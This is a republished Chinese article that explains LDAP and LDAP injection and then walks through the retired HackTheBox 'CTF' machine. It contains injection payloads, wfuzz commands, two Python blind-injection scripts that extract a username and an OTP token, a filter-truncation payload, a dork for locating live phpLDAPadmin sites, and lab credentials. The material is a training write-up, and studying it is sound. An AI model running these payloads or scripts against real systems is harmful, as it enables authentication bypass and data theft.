<!doctype html><html lang=cn><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1"><meta name=referrer content="no-referrer"><link rel=dns-prefetch href=https://i.geekbank.cf/><title>黑客大神浅谈LDAP注入攻击 | 极客快訊</title><meta property="og:title" content="黑客大神浅谈LDAP注入攻击 - 极客快訊"><meta property="og:type" content="article"><meta property="og:locale" content="cn"><meta property="og:image" content="https://p1.pstatp.com/large/pgc-image/61c97d5efdb1486fa6cba6f334bfbd0f"><link rel=alternate hreflang=x-default href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/25042d8.html><link rel=alternate hreflang=zh-tw href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/25042d8.html><link rel=alternate hreflang=zh-cn href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/25042d8.html><link rel=alternate hreflang=zh-hk href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/25042d8.html><link rel=alternate hreflang=zh-mo href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/25042d8.html><link rel=alternate hreflang=zh-my href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/25042d8.html><link rel=alternate hreflang=zh-sg href=https://geekbank.cf/cn/%e7%a7%91%e6%8a%80/25042d8.html><link rel=canonical href=https://geekbank.cf/tw/%e7%a7%91%e6%8a%80/25042d8.html><meta property="article:published_time" content="2020-10-29T20:54:43+08:00"><meta property="article:modified_time" content="2020-10-29T20:54:43+08:00"><meta name=Keywords content><meta name=description content="黑客大神浅谈LDAP注入攻击"><meta name=author content="极客快訊"><meta property="og:url" content="/cn/%E7%A7%91%E6%8A%80/25042d8.html"><link rel=apple-touch-icon sizes=180x180 href=../../apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=../../favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=../../favicon-16x16.png><link rel=manifest href=../../site.webmanifest><link rel=mask-icon href=../../safari-pinned-tab.svg color=#5bbad5><meta name=msapplication-TileColor content="#ffc40d"><meta name=theme-color content="#ffffff"><link rel=stylesheet href=https://geekbank.cf/css/normalize.css><link rel=stylesheet href=https://geekbank.cf/css/style.css><script type=text/javascript src=https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js></script><script type=text/javascript src=https://geekbank.cf/js/jqthumb.min.js></script><script data-ad-client=ca-pub-3525055026201463 async src=https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js></script></head><body><header id=header class=clearfix><div class=container><div class=col-group><div class=site-name><h1><a id=logo href>🤓 极客快讯 Geek Bank</a></h1><p class=description>为你带来最全的科技知识 🧡</p></div><div><nav id=nav-menu class=clearfix><a class=current href>猜你喜歡</a>
<a href=../../tw/categories/%E7%A7%91%E6%8A%80.html title=科技>科技</a>
<a href=../../tw/categories/%E9%81%8A%E6%88%B2.html title=遊戲>遊戲</a>
<a href=../../tw/categories/%E7%A7%91%E5%AD%B8.html title=科學>科學</a></nav></div></div></div></header><div id=body><div class=container><div class=col-group><div class=col-8 id=main><div class=res-cons><article class=post><header><h1 class=post-title>黑客大神浅谈LDAP注入攻击</h1></header><date class="post-meta meta-date">2020-10-29</date><div class=post-meta><span>|</span>
<span class=meta-category><a href=cn/categories/%E7%A7%91%E6%8A%80.html>科技</a></span></div><div class=post-content><p>最近在HackTheBox上氪了金（肉疼�），做了一些已经retired的高质量逻辑，不得不说质量还是很高的。其中有一个靶机叫做<strong>CTF</strong>，难度是最高级别的insane，主要是它考察的知识点比较冷门——LDAP注入。可能很多小伙伴都没怎么听说过这个漏洞，我想主要原因还是LDAP这个协议用的比较少，而且国内CTF比赛中我也基本上没有看到有考察这个点的。在网上搜了一下，发现最近一次出现这个考点的是在CSAW CTF Qualification Round 2018比赛中，题目直接告诉你了是考LDAP注入。刚好上个星期我在星盟内部分享中，也提到了这个知识点，那么本着聊胜于无，开阔知识面的本意下（其实是偷懒？），写下这篇浅谈LDAP注入攻击的文章。</p><p></p><h1 class=pgc-h-arrow-right><strong>0x01 LDAP介绍</strong></h1><h1 class=pgc-h-arrow-right><strong>什么是LDAP</strong></h1><p>在做靶机之前，我们首先来了解一下什么是LDAP？</p><p>以下内容部分摘自2018 blackhat <em>LDAP Injection & Blind LDAP Injection</em></p><p>LDAP(Lightweight Directory Access Protocol):轻量级目录访问协议，是一种在线目录访问协议，主要用于目录中资源的搜索和查询，是X.500的一种简便的实现。</p><p>那么转换成人话就是说，LDAP是用于访问目录服务（特别是基于X.500的目录服务）的轻量级客户端服务器协议，它通过TCP/IP传输服务运行。关键的地方就在于，<strong>数据是存储在目录中，而不是数据库中</strong>。的确，目录和数据库有很多共同之处，都能存储数据、并能在一定程度进行搜索和查询。这里就有一个问题了，目录和数据库的区别在哪？</p><p>最重要的区别就是<strong>目录适合于存放静态数据</strong>，它存储的数据无论在类型和种类较之数据库中的数据都要更为繁多，包括音频、视频、可执行文件、文本等文件，另外目录中还存在目录的递归。既然是存放不同类型的静态数据，那么目录服务在进行优化后更适宜于读访问，而非写、修改等操作。</p><p>说了这么半天，感觉还是贴一张图来的更快。</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/61c97d5efdb1486fa6cba6f334bfbd0f><p class=pgc-img-caption></p></div><p><br></p><p>上面这张图展示了LDAP的结构。我们都知道MySQL数据库中的数据都是按记录一条条记录存在表中，而LDAP是树结构的，数据存储在叶子节点上。比如要描述上图baby这个节点：</p><p>cn=baby, ou=marketing, ou=people, dc=mydomain, dc=org</p><h1 class=pgc-h-arrow-right><strong>LDAP的基本概念</strong></h1><p>在大概知道LDAP是做什么、长什么样之后，我们再来了解一下LDAP的一些基本概念，主要是三个专有名词：条目（Entry）、属性（Attribute）、对象类（ObjectClass）。</p><p><strong>条目</strong></p><p>条目，也叫记录项，是LDAP中最基本的颗粒，就像字典中的词条或者是数据中的记录。通常对LDAP的添加、删除、修改、搜索都是以条目为基本单位。</p><p><strong>属性</strong></p><p>每个条目都可以有很多属性（Attribute），比如常见的人都有姓名、地址、电话等属性。每个属性都有名称及对应的值，属性值可以有单个、多个，比如你有多个邮箱。</p><p>此外，LDAP为人员组织机构中常见的对象都设计了属性(比如commonName，surname)。</p><p><strong>对象类</strong></p><p>对象类是属性的集合，LDAP预想了很多人员组织机构中常见的对象，并将其封装成对象类。比如人员（person）含有姓（sn）、名（cn）、电话(telephoneNumber)、密码(userPassword)等属性，单位职工(organizationalPerson)是人员(person)的继承类，除了上述属性之外还含有职务（title）、邮政编码（postalCode）、通信地址(postalAddress)等属性。</p><p>通过对象类可以方便的定义条目类型。每个条目可以直接继承多个对象类，这样就继承了各种属性。如果2个对象类中有相同的属性，则条目继承后只会保留1个属性。对象类同时也规定了哪些属性是基本信息，即必要属性和可选属性。</p><p>是不是听起来和面向对象语言有点相似，跟Java中的Object类一样，LDAP的根对象类就叫做top。</p><p>上述就是笔者对LDAP数据结构的简单介绍了，LDAP既然主要用于搜索查询，那它是怎么查询的呢？</p><h1 class=pgc-h-arrow-right><strong>LDAP的基本语法</strong></h1><p>LDAP的语法非常简单，一看就会，再看就懂。</p><p>以下部分内容摘自https://blog.csdn.net/leader_ww/article/details/4028672</p><p><strong>=（等于）</strong></p><p>例如，如果希望查找属性giveNname值为John的所有对象，可以使用(givenName=John)。这会返回对应条件的所有对象。</p><p><strong>&（逻辑与）</strong></p><p>例如，如果希望查找居住在 Dallas 并且givenName为John的所有对象，可以使用(&(givenName=John)(l=Dallas))。</p><p>请注意，每个参数都被属于其自己的圆括号括起来。整个 LDAP 语句必须包括在一对主圆括号中。操作符 & 表明，只有每个参数都为真，才会将此筛选条件应用到要查询的对象。</p><p><strong>|（逻辑或）</strong></p><p>例如，如果希望查找属性givenName值为Jhon或者Jack的所有对象，可以使用(|(givenName=Jhon)(givenName=Jack))。</p><p><strong>!（逻辑非）</strong></p><p>例如，如果需要查找givenName为John的对象以外的所有对象。则应使用如下语句：(!givenName=John)</p><p><strong>*（通配符）</strong></p><p>可使用通配符表示值可以等于任何值。使用它的情况可能是：您希望查找具有职务头衔的所有对象。为此，可以使用(title=*)，这会返回title属性包含内容的所有对象。</p><p>另一个例子是：您知道某个对象的givenName属性的开头两个字母是“Jo”。那么，可以使用(givenName=Jo*)进行查找，这会返回givenName以Jo开头的所有对象。</p><p>Over~~LDAP的语法是不是很简单。</p><p>说了这么多，可能很多小伙伴还是心存疑问，已经部署成功的LDAP到底是长什么样子？</p><p>我们可以通过Google Hacking intitle:”phpLDAPadmin” inurl:cmd.php来检索一下，真实的运行的LDAP服务的网站，这个地方我就贴一张图示范一下，包含了上面提到的所有概念。</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/298fe0a3ab8a4376bd6e7defb494b629><p class=pgc-img-caption></p></div><p><br></p><h1 class=pgc-h-arrow-right><strong>0x02 LDAP注入攻击面</strong></h1><p>其实它的攻击手法和SQL注入的原理非常相似，在有漏洞的环境中，这些查询参数没有得到合适的过滤，因而攻击者可以注入任意恶意代码。由于比较简单，我这里就走马观花的方式来过一遍LDAP注入的不同类型。</p><p>以下部分内容摘自https://wooyun.js.org/drops/LDAP%E6%B3%A8%E5%85%A5%E4%B8%8E%E9%98%B2%E5%BE%A1%E5%89%96%E6%9E%90.html</p><h1 class=pgc-h-arrow-right><strong>AND注入</strong></h1><p>这种情况，应用会构造由”&”操作符和用户引入的的参数组成的正常查询在LDAP目录中搜索，例如：</p><p>(&(parameter1=value1)(parameter2=value2))</p><p>这里Value1和value2是在LDAP目录中搜索的值，攻击者可以注入代码，维持正确的过滤器结构但能使用查询实现他自己的目标。</p><p>比如说，为了验证客户端提供的user/password对，构造如下LDAP过滤器并发送给LDAP服务器：</p><p>(&(USER=Uname)(PASSWORD=Pwd))</p><p>如果攻击者输入一个有效的用户名，如r00tgrok，然后在这个名字后面注入恰当的语句，password检查就会被绕过。</p><p>使得Uname=slisberger)(&))，引入任何字符串作为Pwd值，构造如下查询并发送给服务器：</p><p>(&(USER= slisberger)(&)(PASSWORD=Pwd))</p><h1 class=pgc-h-arrow-right><strong>OR注入</strong></h1><p>这种情况，应用会构造由”|”操作符和用户引入的的参数组成的正常查询在LDAP目录中搜索，例如：</p><p>(|(parameter1=value1)(parameter2=value2))</p><p>这里Value1和value2是在LDAP目录中搜索的值，攻击者可以注入代码，维持正确的过滤器结构但能使用查询实现他自己的目标。</p><p>类似的，加入现在用于展示可用资源的查询为：</p><p>(|(type=Rsc1)(type=Rsc2))</p><p>Rsc1和Rsc2表示系统中不同种类的资源。如果攻击者输入Rsc=printer)(uid=*)，则下面的查询被发送给服务器：</p><p>(|(type=printer)(uid=*))(type=scanner)</p><p>这样也会造成注入的产生。</p><h1 class=pgc-h-arrow-right><strong>盲注</strong></h1><p>SQL注入中有盲注，LDAP中也存在这种问题，包括下面介绍到的靶机用到的也是盲注的手法。</p><p>假设攻击者可以从服务器响应中推测出什么，尽管应用没有报出错信息，LDAP过滤器中注入的代码却生成了有效的响应或错误。攻击者可以利用这一行为向服务器问正确的或错误的问题。</p><p>还是用一个例子来说明。</p><p>假设一个Web应用想从一个LDAP目录列出所有可用的Epson打印机，错误信息不会返回，应用发送如下的过滤器：</p><p>(&(objectClass=printer)(type=Epson*))</p><p>使用这个查询，如果有可用的Epson打印机，其图标就会显示给客户端，否则没有图标出现。如果攻击者进行LDAP盲注入攻击</p><p>*)(objectClass=*))(&(objectClass=void</p><p>Web应用会构造如下查询：</p><p>(&(objectClass=*)(objectClass=*))(&(objectClass=void)(type=Epson*))</p><p><strong>仅第一个LDAP过滤器会被处理</strong>：</p><p>(&(objectClass=*)(objectClass=*))</p><p>那么这样就和我们查询的初衷相违背了。</p><p>接下来就是这篇文章的重头戏了，我们主要从这个逻机中学到两点：</p><p>• 怎么发现LDAP注入漏洞</p><p>• 如何利用LDAP注入漏洞</p><p></p><h1 class=pgc-h-arrow-right><strong>0x03 从HTB靶机中学习LDAP注入</strong></h1><h1 class=pgc-h-arrow-right><strong>Initial Enunciation</strong></h1><p>拿到靶机先用Nmap扫一下端口</p><p># Nmap 7.80 scan initiated Fri Jul 10 10:50:40 2020 as: nmap -sC -sV -oN ctf 10.10.10.122</p><p><br></p><p>Nmap scan report for ctf.htb (10.10.10.122)</p><p><br></p><p>Host is up (1.8s latency).</p><p><br></p><p>Not shown: 998 filtered ports</p><p><br></p><p>PORT STATE SERVICE VERSION</p><p><br></p><p>22/tcp open ssh OpenSSH 7.4 (protocol 2.0)</p><p><br></p><p>| ssh-hostkey:</p><p><br></p><p>| 2048 fd:ad:f7:cb:dc:42:1e:43:7d:b3:d5:8b:ce:63:b9:0e (RSA)</p><p><br></p><p>| 256 3d:ef:34:5c:e5:17:5e:06:d7:a4:c8:86:ca:e2:df:fb (ECDSA)</p><p><br></p><p>|_ 256 4c:46:e2:16:8a:14:f6:f0:aa:39:6c:97:46:db:b4:40 (ED25519)</p><p><br></p><p>80/tcp open http Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16)</p><p><br></p><p>|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16</p><p><br></p><p>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</p><p><br></p><p># Nmap done at Fri Jul 10 11:03:44 2020 -- 1 IP address (1 host up) scanned in 783.74 seconds</p><p><br></p><p>查看80端口</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/165021c8835241e39052ed399c3d1430><p class=pgc-img-caption></p></div><p><br></p><p>大概的意思就是让我们尝试去登录这个系统，但是不能用SQLmap或者Dirbuster去暴力猜解用户名和密码。</p><p>再去登录界面看一下：</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/9b90fea6c4bb43e893e2b3f82b1c1536><p class=pgc-img-caption></p></div><p><br></p><p>提示我们是一个OTP，即One Time Password，一般而言是1分钟更新一次。</p><p>查看源码，发现有一个Hint</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/1ac9457533774785a09522598a01300e><p class=pgc-img-caption></p></div><p><br></p><p>如果比较熟悉LDAP的话，这里的两个名词schema和existing attribute已经提示了是关于LDAP注入。</p><p>作者用一个已知的属性去存储了81位的token string，Google搜一下token string (81 digits)。</p><p>https://www.systutorials.com/docs/linux/man/1-stoken/</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/df78e6450de440d8bd967f577c3a02d4><p class=pgc-img-caption></p></div><p><br></p><p>可以看到一个关键的地方，Pure numeric (81-digit) "ctf" (compressed token format) strings，和靶机的题目相契合，现在就有一点思路了，应该要去找到这个81位纯数字的token，然后用stoken工具去生成OTP。那么主要是找到token，唯一可以利用的就是这个登录框了。</p><p>先随便用某个用户名和密码登录admin:1234</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/0bd1e743ecd14f4a8b8f58e751f153c8><p class=pgc-img-caption></p></div><p><br></p><p>返回User admin not found，再用SQL注入的万能密码试一试</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/ed711959c3f8496d8720c6c00cd2bc4a><p class=pgc-img-caption></p></div><p><br></p><p>直接是没有任何显示，应该是对一些特殊字符有黑名单过滤。Fuzz一下过滤了一些什么字符</p><p>wfuzz -c --hw 233 -d 'inputUsername=FUZZ&inputOTP=1234' -w special-chars.txt 10.10.10.122/login.php</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/a2a1da791b4a44578fa2d80ae2b12fcc><p class=pgc-img-caption></p></div><p><br></p><p>—hw 233 代表过滤掉形如User xxx not found的返回信息。</p><p>我们发现+和&返回的是232 Words，但是在页面测试一下</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/f378d72adb6940319b75647329c5ab44><p class=pgc-img-caption></p></div><p><br></p><p>发现返回的还是User + not found或者User & not found，这样的话应该是233 Words，而不是Wfuzz返回的232 Words。</p><p>我们尝试把这些特殊字符二次URL编码，看Web应用是否还能解析，用seclists中的doble<em>uri</em>hex.txt作为字典</p><p>wfuzz -c --hw 233 -d 'inputUsername=FUZZ&inputOTP=1234' -w doble-uri-hex.txt 10.10.10.122/login.php</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/02c27723feb541f6b1e1f409d5e9435e><p class=pgc-img-caption></p></div><p><br></p><p>最后Fuzz出来的被过滤的字符就是</p><p>%2500 ---> %00</p><p><br></p><p>%2528 ---> (</p><p><br></p><p>%2529 ---> )</p><p><br></p><p>%252a ---> *</p><p><br></p><p>%255c ---> \</p><p><br></p><p>这些被过滤的字符就是LDAP注入需要过滤的所有字符，再结合login.php页面源代码中的hint，可以确定是LDAP注入。</p><h1 class=pgc-h-arrow-right><strong>Getting User Access</strong></h1><p>先来看LDAP注入的最基本形式</p><p>(&</p><p><br></p><p>(password=1234)</p><p><br></p><p>(uid=ca01h%00)</p><p><br></p><p>)</p><p><br></p><p>具体到这个靶机的话，我们需要猜解括号的个数。运用类似盲注的思想，如果注入成功，那么就会返回User ca01h not found。</p><p>假设只有一个括号：</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/a3c0ffaac6ea417d8b3625b0b4310c8c><p class=pgc-img-caption></p></div><p><br></p><p>假设有两个括号：</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/007eba3e4c9e48cbac3ab3ae5504ebbb><p class=pgc-img-caption></p></div><p><br></p><p>假设有三个括号：</p><p>当尝试到三个括号用于闭合时，成功返回了User ca01h%29%29%29%00 not found，那么这个登录框的LDAP查询的基本形式就是</p><p>(&</p><p><br></p><p>(&</p><p><br></p><p>(password=1234)</p><p><br></p><p>(uid=ca01h)))%00</p><p><br></p><p>)</p><p><br></p><p>(&|</p><p><br></p><p>(other comparing)</p><p><br></p><p>)</p><p><br></p><p>)</p><p><br></p><p>接着，我们再回头去看一下Fuzz出来的被过滤的字符，其中%25%2a返回的消息长度为231 Words</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/2230a73c0bcc4e5b90ae8a84dbce9a79><p class=pgc-img-caption></p></div><p><br></p><p>发现回响的消息是Cannot login，说明可以用*通配符来盲注用户名，脚本如下：</p><p><em>#!/usr/bin/env python3</em></p><p><br></p><p><em>### username_burp.py</em></p><p><br></p><p>import sys</p><p><br></p><p>import time</p><p><br></p><p>from string import ascii_lowercase</p><p><br></p><p>from urllib.parse import quote_plus</p><p><br></p><p>import requests</p><p><br></p><p>URL = 'http://10.10.10.122/login.php'</p><p><br></p><p>username, done = '', False</p><p><br></p><p>print()</p><p><br></p><p><strong>while</strong> <strong>not</strong> done:</p><p><br></p><p><strong>for</strong> c <strong>in</strong> ascii_lowercase:</p><p><br></p><p>payload = username + c + quote_plus('*')</p><p><br></p><p>data = {</p><p><br></p><p>'inputUsername': payload,</p><p><br></p><p>'inputOTP': '1234'</p><p><br></p><p>}</p><p><br></p><p>resp = requests.post(URL, data=data)</p><p><br></p><p><strong>if</strong> 'Cannot login' <strong>in</strong> resp.text:</p><p><br></p><p>username += c</p><p><br></p><p><strong>break</strong></p><p><br></p><p>sys.stdout.write(f'\r{username}{c}')</p><p><br></p><p>time.sleep(0.2)</p><p><br></p><p><strong>else</strong>:</p><p><br></p><p>done = True</p><p><br></p><p>print(f'[+] Username: {username} \n')</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/db2c4517948b46638e1b47713a862a5f><p class=pgc-img-caption></p></div><p><br></p><p>用户名为ldapuser</p><p>知道了用户名之后，我们就要去获取生成OTP的81位token，通过页面源代码的提示，这个token存储在某一个LDAP默认已经存在的属性当中。而默认的属性可以在PayloadsAllTheThings中找到：</p><p>c</p><p><br></p><p>cn</p><p><br></p><p>co</p><p><br></p><p>commonName</p><p><br></p><p>dc</p><p><br></p><p>facsimileTelephoneNumber</p><p><br></p><p>givenName</p><p><br></p><p>gn</p><p><br></p><p>homePhone</p><p><br></p><p>id</p><p><br></p><p>jpegPhoto</p><p><br></p><p>l</p><p><br></p><p>mail</p><p><br></p><p>mobile</p><p><br></p><p>name</p><p><br></p><p>o</p><p><br></p><p>objectClass</p><p><br></p><p>ou</p><p><br></p><p>owner</p><p><br></p><p>pager</p><p><br></p><p>password</p><p><br></p><p>sn</p><p><br></p><p>st</p><p><br></p><p>surname</p><p><br></p><p>uid</p><p><br></p><p>username</p><p><br></p><p>userPassword</p><p><br></p><p>如果不想写脚本的话用wfuzz来Fuzz靶机的LDAP中存在的属性可能会更快一些，但还是要先找到注入的形式：</p><p>(&</p><p><br></p><p>(&</p><p><br></p><p>(password=1234)</p><p><br></p><p>(uid=ldapuser)</p><p><br></p><p>(FUZZ=*)</p><p><br></p><p>)</p><p><br></p><p>(&|</p><p><br></p><p>(other comparing)</p><p><br></p><p>)</p><p><br></p><p>)</p><p><br></p><p>此外还要把注入的字符ldapuser)(FUZZ=*进行二次URL编码，编码之后的结果ldapuser%2529%2528FUZZ%253d%252a。</p><p>wfuzz -c --hw 233 -d 'inputUsername=ldapuser%2529%2528FUZZ%253d%252a&inputOTP=1234' -w LDAP_attributes.txt http://10.10.10.122/login.php</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/c842ee47435f4053be0b892b8db96bc2><p class=pgc-img-caption></p></div><p><br></p><p>我们Fuzz出来了这么些属性是存在于靶机的LDAP服务中的，现在的工作就是一个一个的属性来拆解，属于一些重复性的工作，就不在这里过多赘述了，最后可以找到token是存储于pager属性中。接着写脚本用来burp81位token</p><p><em>#!/usr/bin/python3</em></p><p><br></p><p><em># pager_burp.py</em></p><p><br></p><p>import requests</p><p><br></p><p>import sys</p><p><br></p><p>from time import sleep</p><p><br></p><p>from string import digits</p><p><br></p><p>token = ""</p><p><br></p><p>URL = "http://10.10.10.122/login.php"</p><p><br></p><p>attribute = "pager"</p><p><br></p><p>loop = 1</p><p><br></p><p><strong>while</strong> loop > 0:</p><p><br></p><p><strong>for</strong> digit <strong>in</strong> digits:</p><p><br></p><p>token = token</p><p><br></p><p><em># ldapuser)(pager=&lt;token>)*</em></p><p><br></p><p>payload = f"ldapuser%29%28{attribute}%3d{token}{digit}%2a"</p><p><br></p><p>data = {"inputUsername": payload, "inputOTP": "1234"}</p><p><br></p><p>r = requests.post(URL, data=data)</p><p><br></p><p>sys.stdout.write(f"\rToken: {token}{digit}")</p><p><br></p><p>sleep(0.5)</p><p><br></p><p><strong>if</strong> b"Cannot login" <strong>in</strong> r.content:</p><p><br></p><p>token += digit</p><p><br></p><p><strong>break</strong></p><p><br></p><p><strong>elif</strong> digit == "9":</p><p><br></p><p>loop = 0</p><p><br></p><p><strong>break</strong></p><p><br></p><p>print(f'[+] Token: {token} \n')</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/550eab002ab54565ada286975a600954><p class=pgc-img-caption></p></div><p><br></p><p>这里值得注意的是需要删掉最后的一个9，所以最后的token就是：</p><p>285449490011357156531651545652335570713167411445727140604172141456711102716717000</p><p>接着用stoken工具导入token</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/af97a44f8e6a4c2db9b7c0cd15e33f44><p class=pgc-img-caption></p></div><p><br></p><p>生成OTP</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/5854a9018bb14279ad1a343cb8364d4f><p class=pgc-img-caption></p></div><p><br></p><p>成功登录后，跳转到page.php页面，可以执行命令</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p9.pstatp.com/large/pgc-image/5f1aa64aebe74e04a63bf69441bca3fb><p class=pgc-img-caption></p></div><p><br></p><p>Damn it…..提示我们ldapuser权限不够不能执行命令，这里有两种办法：</p><p>• 对</p><p>group</p><p>属性进行注入，即把后面group属性的filter截断</p><p>(&</p><p><br></p><p>(&</p><p><br></p><p>(pager=&lt;token>)</p><p><br></p><p>(uid=ldapuser)))%00</p><p><br></p><p>)</p><p><br></p><p>(|</p><p><br></p><p>(group=root)</p><p><br></p><p>(group=adm)</p><p><br></p><p>)</p><p><br></p><p>)</p><p><br></p><p>• 使用*通配符作为用户名登录</p><p>这里演示一下第一种方案，payload直接放到burp中</p><p>ldapuser%2529%2529%2529%2500</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/8dd727e4ba0c4df8a1427ca0a639c631><p class=pgc-img-caption></p></div><p><br></p><p>再去执行ls命令</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/753f782d42814ee188241c479d4a9104><p class=pgc-img-caption></p></div><p><br></p><p>读取page.php文件：</p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p3.pstatp.com/large/pgc-image/60076d12a93b4c938ce236a6cb86a361><p class=pgc-img-caption></p></div><p><br></p><p>SSH登录：fdapuser:e398e27d5c4ad45086fe431120932a01</p><p></p><div class=pgc-img><img alt=黑客大神浅谈LDAP注入攻击 onerror=errorimg.call(this); src=https://p1.pstatp.com/large/pgc-image/58450574c0424f23931024d831dc8a59><p class=pgc-img-caption></p></div><p><br></p><p>原文地址：https://www.anquanke.com/post/id/212186</p></div><div class="post-meta meta-tags"><ul class=clearfix><li><a>'浅谈','LDAP','攻击'</a></li></ul></div></article></div></div><div id=secondary><section class=widget><form id=search action=//www.google.com/search method=get accept-charset=utf-8 target=_blank _lpchecked=1><input type=text name=q maxlength=20 placeholder=搜索>
<input type=hidden name=sitesearch value=geekbank.cf>
<button type=submit>🔍</button></form></section><section class=widget><h3 class=widget-title>最新文章 ⚡</h3><ul class=widget-list></ul></section><section class=widget><h3 class=widget-title>其他</h3><ul class=widget-list><li><a href=TOS.html>使用條款</a></li><li><a href=CommentPolicy.html>留言政策</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>DMCA</a></li><li><a href=mailto:gdnews@tuta.io rel=nofollow>聯絡我們</a></li></ul></section></div></div></div></div><footer id=footer><div class=container>&copy; 2020 <a href>极客快訊</a></div></footer><script type=text/javascript>window.MathJax={tex2jax:{inlineMath:[['$','$']],processEscapes:true}};</script><script src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script><a id=rocket href=#top></a><script type=text/javascript src=https://kknews.cf/js/totop.js async></script><script type=application/javascript>var doNotTrack=false;if(!doNotTrack){window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;ga('create','UA-146415161-2','auto');ga('send','pageview');}</script><script async src=https://www.google-analytics.com/analytics.js></script><script type=text/javascript src="//s7.addthis.com/js/300/addthis_widget.js#pubid=ra-5e508ed9e4e698bb"></script></body></html>